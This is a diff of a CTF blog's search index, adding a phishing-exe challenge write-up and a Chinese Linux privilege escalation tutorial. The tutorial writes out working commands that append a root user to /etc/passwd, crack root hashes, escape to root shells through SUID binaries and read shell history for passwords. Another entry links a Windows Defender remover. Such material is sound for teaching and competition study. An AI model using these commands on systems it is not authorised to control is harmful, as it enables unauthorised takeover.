@@ -1,6 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>18届软件创新攻防赛部分wp</title>
+    <url>/2025/01/18%E5%B1%8A%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E6%94%BB%E9%98%B2%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
+    <content><![CDATA[<h1 id="1-钓鱼邮件"><a href="#1-钓鱼邮件" class="headerlink" title="1.钓鱼邮件"></a>1.钓鱼邮件</h1><p>拿到一个eml，可以用qq邮箱给自己写信，然后附件带上这个eml，之后自己就能收到这个邮件，预览一下可以看到：</p>
+<img src="屏幕截图 2025-01-05 183618.png" alt="屏幕截图 2025-01-05 183618" style="zoom:75%;">
+
+<p>发现有一个<code>生日礼物.zip</code>，点击下载</p>
+<p>下载得到的zip发现有密码，使用arp爆破一下得到密码：20001111</p>
+<img src="屏幕截图 2025-01-05 183758.png" alt="屏幕截图 2025-01-05 183758" style="zoom: 50%;">
+
+<p>然后发现一个exe，双击运行。</p>
+<p>然后使用火绒剑，监控网络，就能发现这个 生日礼物.exe</p>
+<p>因为会实时变化，记得要截图看会好看一点。</p>
+<img src="屏幕截图 2025-01-05 184101.png" alt="屏幕截图 2025-01-05 184101" style="zoom:75%;">
+
+<p>放大就能看到这个远程地址 222.218.218.218:55555</p>
+<img src="屏幕截图 2025-01-05 184221.png" alt="屏幕截图 2025-01-05 184221" style="zoom:75%;">
+
+<p>包上md5得到flag：df3101212c55ea8c417ad799cfc6b509</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+        <tag>CTF</tag>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2024冬季春秋杯部分wp</title>
     <url>/2025/01/2024%E5%86%AC%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
     <content><![CDATA[<p>全部解析可以在春秋伽玛的公众号上看到</p>
@@ -74,8 +104,8 @@
         <category>WP</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>misc</tag>
+        <tag>CTF</tag>
         <tag>WP</tag>
       </tags>
   </entry>
@@ -260,9 +290,19 @@
         <category>WP</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>misc</tag>
+        <tag>CTF</tag>
         <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ACMer</title>
+    <url>/2024/11/ACMer/</url>
+    <content><![CDATA[<p>还没想好写啥</p>
+<p><img src="111.jpg" alt="111"></p>
+]]></content>
+      <tags>
+        <tag>ACM</tag>
       </tags>
   </entry>
   <entry>
@@ -279,6 +319,245 @@
 <p><strong>①13968975069</strong></p>
 <p><strong>②18072320271</strong></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>Linux提权浅析</title>
+    <url>/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="passwd提权"><a href="#passwd提权" class="headerlink" title="passwd提权"></a>passwd提权</h1><p><code>/etc/passwd</code>和 <code>/etc/shadow</code>文件是 Linux 系统登录认证的关键文件，如果系统运维人员对 <code>passwd</code>或 <code>shadow</code>文件的内容或权限配置有误，则可以被利用来进行系统提权。</p>
+<p>我们先了解一下 <code>/etc/passwd</code>内容的含义：</p>
+<p>Linux 密码信息保存在两个文件中，分别为：<code>/etc/passwd</code>和 <code>/etc/shadow</code></p>
+<p><code>/etc/passwd</code>文件用于保存用户信息，<strong>每一行代表一个用户</strong>，每一行通过冒号 <code>:</code>分为七个部分:</p>
+<ol>
+<li>用户名</li>
+<li>密码，若为 <code>x</code>则表示密码保存在<code>/etc/shadow</code></li>
+<li>UID，0 代表 root</li>
+<li>GID，表示所在组</li>
+<li>描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other</li>
+<li>用户主目录</li>
+<li>默认 shell 类型</li>
+</ol>
+<p>例如，假设 <code>/etc/passwd</code>文件中其中一行信息如下：</p>
+<p><img src="1607657766_5fd2e926952afffe8e697.png" alt="1607657766_5fd2e926952afffe8e697"></p>
+<p>其含义解读如下：</p>
+<p>​	*用户名：test-user</p>
+<p>​	*密码保存在 <code>/etc/shadow</code>中</p>
+<p>​	*UID 为 1001</p>
+<p>​	*GID 为 1001</p>
+<p>​	*描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]</p>
+<p>​	*用户主目录为 <code>/home/test-user</code></p>
+<p>​	*默认 shell 为 <code>/bin/bash</code></p>
+<p>因此在登陆时候的权限是通过第三个字段 <code>UID</code>和第四个字段 <code>GID</code>确定。其中 <code>UID=0</code>代表 root 用户</p>
+<p><strong>如果我们能够对 <code>/etc/passwd</code>文件内容进行伪造、篡改，那就能很轻易的登录成功并获取任意用户权限。</strong></p>
+<p>所以，获取passwd的写入权限十分重要</p>
+<p>通常来说，通过 <code>/etc/passwd</code>提权的方法有两种：</p>
+<ol>
+<li>如果具有 <code>/etc/passwd</code>的 <strong>w</strong> (写入) 权限，可以直接添加一个 root 权限的用户</li>
+<li>如果 <code>/etc/passwd</code>中存储 root 用户密码哈希，可以使用 john 进行破解</li>
+</ol>
+<h3 id="场景一：-etc-passwd-具有写权限"><a href="#场景一：-etc-passwd-具有写权限" class="headerlink" title="场景一：&#x2F;etc&#x2F;passwd 具有写权限"></a>场景一：&#x2F;etc&#x2F;passwd 具有写权限</h3><p>查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>如果有 <code>--wx--xrwx</code> 意味着我们具有写入权限，接下来我们需要做的就是</p>
+<p><strong>自己构造一行用户数据添加到 passwd 文件中，用户名和密码自定义，并且将 <code>UID</code>设置为 <code>0</code>，此时我们登陆就可以获取 root 权限。</strong></p>
+<p>查看 passwd 文件中 root 用户数据的格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep root</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>先设置用户名，如syl-passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syl-passwd:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>设置密码，由于密码并不是明文而是经过 hash 算法加密之后的密文字符串，我们使用 <code>openssl</code>套件</p>
+<p>使用 <code>openssl</code>创建一个密码为 pass123 的 linux hash，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt ignite pass123</span><br><span class="line">#-1 ：使用 MD5 hash 算法</span><br><span class="line">#-salt ：对 hash 算法加 &quot;盐&quot;</span><br></pre></td></tr></table></figure>
+
+<p>计算得到密码$1$ignite$3eTbJm98O9Hz.k1NTdNxe1，接着构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>添加到passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br><span class="line">#必须使用单引号，不能使用双引号</span><br><span class="line">#使用 &gt;&gt;，而不是 &gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样即添加成功，也可以再次查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep syl-passwd</span><br></pre></td></tr></table></figure>
+
+<p>接下来su syl-passwd切换到 syl-passwd 用户，密码为 pass123即可拿到权限</p>
+<h3 id="场景二：-etc-passwd-存储用户密码-hash"><a href="#场景二：-etc-passwd-存储用户密码-hash" class="headerlink" title="场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash"></a>场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash</h3><p>一样查看读写权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>但是发现权限配置都是正确的，普通用户只具有 <code>/etc/passwd</code>文件的<strong>读</strong>权限。</p>
+<p>接下来查看 <code>/etc/passwd</code>文件的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>结果发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>中间的$1$ignite$J98A8EVPG1O40.WnwrPEM1即是root的密码哈希值，接下来所做的就是john了</p>
+<p>先将之前获取到的 root 用户 hash 写入文件 hash.txt 中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash&#x27; &gt; ~/hash.txt</span><br><span class="line"># 此处必须单引号</span><br></pre></td></tr></table></figure>
+
+<p>然后就john：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john ~/hash.txt</span><br></pre></td></tr></table></figure>
+
+<p>最后得到密码是hello</p>
+<p>接下来就一样了，su root，提权。</p>
+<h1 id="shadow提权"><a href="#shadow提权" class="headerlink" title="shadow提权"></a>shadow提权</h1><p>shadow提权与passwd类似</p>
+<p>都是获取root密码的哈希值然后进行爆破</p>
+<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p><strong>什么是suid提权？</strong></p>
+<p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p>
+<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p>
+<p>linux引入了3个文件来管理用户组：</p>
+<ol>
+<li>&#x2F;etc&#x2F;passwd存放用户信息。</li>
+<li>&#x2F;etc&#x2F;shadow存放用户密码信息。</li>
+<li>&#x2F;etc&#x2F;group存放组信息</li>
+</ol>
+<p>利用原理：在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。</p>
+<h2 id="如何设置suid"><a href="#如何设置suid" class="headerlink" title="如何设置suid"></a>如何设置suid</h2><p>列出所有文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+
+<p>设置suid：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod u+s filename #设置suid</span><br><span class="line">chmod u-s filename #去除suid</span><br></pre></td></tr></table></figure>
+
+<p>如果文件从<code>-rw</code>变成了<code>-rwS</code>说明添加上了suid权限</p>
+<p>注意：</p>
+<ul>
+<li>只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义</li>
+<li>命令执行者要对该程序文件拥有执行(x)权限才能使用</li>
+<li>SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</li>
+</ul>
+<p>具有suid权限的二进制可执行文件有：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h2><p>查找系统上运行的suid文件，且查找具有root权限的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># /表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line"># -perm 表示搜索随后的权限</span><br><span class="line"># -u = s表示查找root用户拥有的文件</span><br><span class="line"># -type表示我们正在寻找的文件类型</span><br><span class="line"># f 表示常规文件，而不是目录或特殊文件</span><br><span class="line"># 2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line"># &gt;表示重定向</span><br><span class="line"># /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>
+
+<p>查找如下：</p>
+<img src="屏幕截图 2025-01-27 160340.png" alt="屏幕截图 2025-01-27 160340" style="zoom:80%;">
+
+<p>ls一下看看是否设置了suid权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /usr/bin/su</span><br><span class="line">#查看/usr/bin/su有无suid权限</span><br></pre></td></tr></table></figure>
+
+<p>如果看到确实设置了suid权限，而且属主为root，现在我们就可以利用我们之前提到的suid可执行二进制文件从而进行提权。</p>
+<h2 id="进行提权"><a href="#进行提权" class="headerlink" title="进行提权"></a>进行提权</h2><p><strong>这里的前提都是要有suid权限</strong></p>
+<p>如果之前查找到的<code>usr/bin/find</code>具有root权限，就用find命令进行提权</p>
+<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find filename -exec whoami \; -quit</span><br><span class="line"># root</span><br><span class="line">find filename -exec /bin/sh -p \; -quit</span><br><span class="line"># whoami</span><br><span class="line"># root</span><br><span class="line"></span><br><span class="line"># 这里的filename对应的文件要有suid权限，比如之前看到/usr/bin/su有suid权限这里就是/usr/bin/su</span><br></pre></td></tr></table></figure>
+
+<p>还有一种差不多的提权方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span><br><span class="line">touch 1.txt #创建1.txt</span><br><span class="line">/usr/bin/find 1.txt -exec whoami \;</span><br></pre></td></tr></table></figure>
+
+<p>好像也可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /etc/passwd -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure>
+
+<p>如果最后出了个<code>root</code>就说明提权成功了</p>
+<p>同理，不只find命令，有很多赋予suid权限的文件可以达到权限提升的效果(实际上也和rbash逃逸、sudo提权那些获取shell的命令相似)，这里列举几个：</p>
+<table>
+<thead>
+<tr>
+<th align="left">suid文件</th>
+<th align="left">提权命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;bash</td>
+<td align="left">bash -p</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;csh</td>
+<td align="left">csh -b</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;sh</td>
+<td align="left">sh -p</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;ksh</td>
+<td align="left">ksh -p</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;zsh</td>
+<td align="left">zsh</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;find</td>
+<td align="left">find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;awk</td>
+<td align="left">awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;man</td>
+<td align="left">!&#x2F;bin&#x2F;bash</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;more</td>
+<td align="left">!&#x2F;bin&#x2F;bash</td>
+</tr>
+</tbody></table>
+<p><strong>利用相关命令均可在这个网站上查询</strong>：<a href="https://gtfobins.github.io/">GTFOBins</a></p>
+<h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><p>适用版本：nmap2.02至5.21。</p>
+<p>nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受影响的范围内或更早就可以尝试使用这种方法进行提权。</p>
+<p>首先是进入nmap交互模式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
+
+<p>之后利用命令进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line"></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-more"><a href="#less-more" class="headerlink" title="less&#x2F;more"></a>less&#x2F;more</h3><p>使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用<code>!</code>命令进入shell。</p>
+<p>less与more相似，以less为例</p>
+<p>less是一种查看文件的命令，但是我们也可以利用less进行执行我们的shell命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>之后进入交互界面，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VISUAL=&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot; less /etc/profile</span><br><span class="line">v</span><br><span class="line"></span><br><span class="line">less /etc/profile</span><br><span class="line">v:shell</span><br></pre></td></tr></table></figure>
+
+<p>就可以进入交互界面然后写入shell的</p>
+<h3 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h3><p>nano进入shell页面似乎比较简单</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nano</span><br><span class="line">ctrl + R</span><br><span class="line">ctrl + X</span><br><span class="line">#shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="cp-mv"><a href="#cp-mv" class="headerlink" title="cp&#x2F;mv"></a>cp&#x2F;mv</h3><p>以cp为例</p>
+<p>主要是利用cp命令覆盖&#x2F;etc&#x2F;passwd从而进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">#qszd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt test testaaa</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su - test</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h3><p>vim为例</p>
+<p>首先是一种比较特殊的情况，就是vim被配置了suid权限，所以只有root才能有权限进行读写，这种时候就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim.tiny /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:!/bin/sh</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="其他提权"><a href="#其他提权" class="headerlink" title="其他提权"></a>其他提权</h1><h2 id="通过查询历史记录从而获得信息泄露的信息"><a href="#通过查询历史记录从而获得信息泄露的信息" class="headerlink" title="通过查询历史记录从而获得信息泄露的信息"></a>通过查询历史记录从而获得信息泄露的信息</h2><p>利用以下命令可以获取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure>
+
+<p>这个命令可以查看当前用户使用过的历史命令</p>
+<p>有可能会得到root登录的密码</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Linux</tag>
+      </tags>
   </entry>
   <entry>
     <title>Misc Record</title>
@@ -1326,8 +1605,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>misc</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1461,16 +1740,16 @@
 <p>这样实在看不懂的乱码可以试试把txt拖进010，</p>
 <p>在010的视图里面选择EBCDIC，说不定能看到。</p>
 <h2 id="反转的16进制"><a href="#反转的16进制" class="headerlink" title="反转的16进制"></a><u>反转的16进制</u></h2><p>有时候遇到打开文本，看到一堆东西，能观察出是反转过的16进制文件（因为发现了文件头）</p>
-<p>可以使用puzzlesolver的反转</p>
-<p>或者使用脚本反转回来：</p>
+<p>可以使用puzzlesolver的反转（没那么好用，建议一般找ai跑脚本）</p>
+<p>或者使用脚本反转回来，这里脚本仅处理一种情况，最终还是得ai跑。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:/python3.7/1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:  <span class="comment">#记得改路径</span></span><br><span class="line">    text = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文本按空格分隔成列表</span></span><br><span class="line">hex_numbers = text.split()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反转每个十六进制数字，并转换为大写</span></span><br><span class="line">reversed_hex_numbers = [num[::-<span class="number">1</span>].upper() <span class="keyword">for</span> num <span class="keyword">in</span> hex_numbers]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每16个数字分为一行</span></span><br><span class="line">lines = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(reversed_hex_numbers), <span class="number">16</span>):</span><br><span class="line">    line = <span class="string">&#x27; &#x27;</span>.join(reversed_hex_numbers[i:i+<span class="number">16</span>])</span><br><span class="line">    lines.append(line)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将所有行连接成最终文本</span></span><br><span class="line">reversed_text = <span class="string">&#x27;\n&#x27;</span>.join(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:/python3.7/reversed_document.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(reversed_text)</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<h2 id="看不到的情况——sunblime"><a href="#看不到的情况——sunblime" class="headerlink" title="看不到的情况——sunblime"></a><u>看不到的情况——sunblime</u></h2><p>有时候什么东西都看不到，感觉类似于无字天书。</p>
-<p>可以复制进sunblime看看</p>
+<h2 id="sunblime——代码编辑器"><a href="#sunblime——代码编辑器" class="headerlink" title="sunblime——代码编辑器"></a><u>sunblime——代码编辑器</u></h2><p>有时候什么东西都看不到，感觉类似于无字天书。可以复制进sunblime看看</p>
+<p>而且感觉sublime text类似于notepad++，有很多莫名奇妙的后缀文件一般都可以打开。</p>
 <h1 id="图片题"><a href="#图片题" class="headerlink" title="图片题"></a><u>图片题</u></h1><h2 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a><u>思路：</u></h2><p>可以先拖进随波逐流看看</p>
 <p>没有再010看看有无隐写</p>
 <p>实在不行看看文件属性里有没有备注</p>
@@ -1795,6 +2074,8 @@
 <p>理论上也可以更改vhd格式来使用vmware挂载。</p>
 <p>如果vhd用了BitLocker加密的话我们可以使用<code>Elcomsoft Forensic Disk Decryptor</code>进行解密</p>
 <h2 id="iso映像文件"><a href="#iso映像文件" class="headerlink" title="iso映像文件"></a><u>iso映像文件</u></h2><p>一般是u盘文件，可以直接改后缀为zip然后解压，或者formost提取出里面的内容</p>
+<h2 id="安卓取证"><a href="#安卓取证" class="headerlink" title="安卓取证"></a><u>安卓取证</u></h2><p>安卓取证一般是给<code>vmdk</code>文件或者<code>ovf</code>文件，都可以用vmware挂载，后者可以直接在vm打开文件</p>
+<h3 id="DiskGenius"><a href="#DiskGenius" class="headerlink" title="DiskGenius"></a>DiskGenius</h3><p>用于恢复磁盘删除的文件，也可以直接全部扫描然后提出来。</p>
 <h1 id="pyjail-py沙盒逃逸"><a href="#pyjail-py沙盒逃逸" class="headerlink" title="pyjail &#x2F; py沙盒逃逸"></a><u>pyjail &#x2F; py沙盒逃逸</u></h1><h2 id="思路：-7"><a href="#思路：-7" class="headerlink" title="思路："></a><u>思路：</u></h2><p>要看他给没给源代码，没有怎么猜测，给了怎么绕过黑名单&#x2F;长度限制等等</p>
 <h1 id="ms-office题"><a href="#ms-office题" class="headerlink" title="ms-office题"></a><u>ms-office题</u></h1><h2 id="思路：-8"><a href="#思路：-8" class="headerlink" title="思路："></a><u>思路：</u></h2><p>可以改后缀为zip看看，文本里可能会把文字改成白色的来隐藏可以ctrla+改色看看</p>
 <h2 id="ms-office文件本质是zip"><a href="#ms-office文件本质是zip" class="headerlink" title="ms-office文件本质是zip"></a><u>ms-office文件本质是zip</u></h2><p>MS-Office文件word、excel、ppt本质都是zip文件，就可以隐写。</p>
@@ -1840,7 +2121,7 @@
 <img src="2024-11-20 213106.png" alt="2024-11-20 213106" style="zoom:25%;">
 
 <p>可以直接使用记事本的替换功能，比脚本好用的多</p>
-<p>脚本（不推荐）：</p>
+<p><del>脚本</del>（<strong>不推荐</strong>）：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\meihuai.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> res:  <span class="comment"># 坐标格式文件比如(7,7)</span></span><br><span class="line">    re = res.read()</span><br><span class="line">    res.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> gnup:   <span class="comment"># 将转换后的坐标写入output.txt</span></span><br><span class="line">    re = re.split()</span><br><span class="line">    tem = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(re)):</span><br><span class="line">        tem = re[i]</span><br><span class="line">        tem = tem.lstrip(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        tem = tem.rstrip(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tem)):</span><br><span class="line">            <span class="keyword">if</span> tem[j] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">                tem = tem[:j] + <span class="string">&#x27; &#x27;</span> + tem[j+<span class="number">1</span>:]</span><br><span class="line">        gnup.write(tem + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    gnup.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>然后</p>
@@ -1894,455 +2175,22 @@
 
 
 <h3 id="alt"><a href="#alt" class="headerlink" title="alt"></a>alt</h3><p>按住alt再按小键盘的数字的话可以输出对应的ascii码值，比如我按住alt再按65的话会输出A</p>
-<h3 id="删除windows自带防火墙——windows-defender"><a href="#删除windows自带防火墙——windows-defender" class="headerlink" title="删除windows自带防火墙——windows defender"></a>删除windows自带防火墙——windows defender</h3><p>github网址： <a href="https://github.com/ionuttbara/windows-defender-remover">https://github.com/ionuttbara/windows-defender-remover</a></p>
+<h3 id="删除windows自带防火墙——windows-defender"><a href="#删除windows自带防火墙——windows-defender" class="headerlink" title="删除windows自带防火墙——windows defender"></a>删除windows自带防火墙——windows defender</h3><p>github地址： <a href="https://github.com/ionuttbara/windows-defender-remover">https://github.com/ionuttbara/windows-defender-remover</a></p>
 <h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a><u>Linux提权</u></h2><p>详细见我这篇博客 <a href="https://metaviii.github.io/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/">Linux提权浅析 | MetaVi</a></p>
+<h2 id="区块链Blockchain"><a href="#区块链Blockchain" class="headerlink" title="区块链Blockchain"></a><u>区块链Blockchain</u></h2><p>详见我这篇博客 <a href="https://metaviii.github.io/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/">区块链学习 | MetaVi</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACMer</title>
-    <url>/2024/11/ACMer/</url>
-    <content><![CDATA[<p>还没想好写啥</p>
-<p><img src="111.jpg" alt="111"></p>
-]]></content>
-      <tags>
-        <tag>ACM</tag>
-      </tags>
-  </entry>
-  <entry>
